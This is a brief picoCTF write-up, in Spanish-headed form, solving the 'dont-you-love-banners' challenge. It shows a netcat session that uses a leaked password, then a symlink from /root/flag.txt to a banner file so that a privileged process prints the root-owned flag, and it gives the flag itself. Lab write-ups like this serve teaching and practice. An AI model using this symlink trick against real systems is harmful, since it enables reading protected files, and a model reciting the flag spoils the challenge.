### dont-you-love-banners
### Descripcion

Can you abuse the banner?The server has been leaking some crucial information on `tethys.picoctf.net 61939`. Use the leaked information to get to the server.To connect to the running application use `nc tethys.picoctf.net 49545`. From the above information abuse the machine and find the flag in the /root directory.

### Solucion

┌──(JorgeMSI㉿MSI)-[~]
└─$ nc tethys.picoctf.net 49545

---

**WELCOME****

---

what is the password? My_Passw@rd_@1234 
What is the top cyber security conference in the world? defcon 
the first hacker ever was known for phreaking(making free phone calls)
who was it? john
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
rm: cannot remove '/home/player/banner': No such file or directory
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner

┌──(JorgeMSI㉿MSI)-[~]
└─$ nc tethys.picoctf.net 49545
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}

**picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_a0e119d4}**

### Notas

### Referencias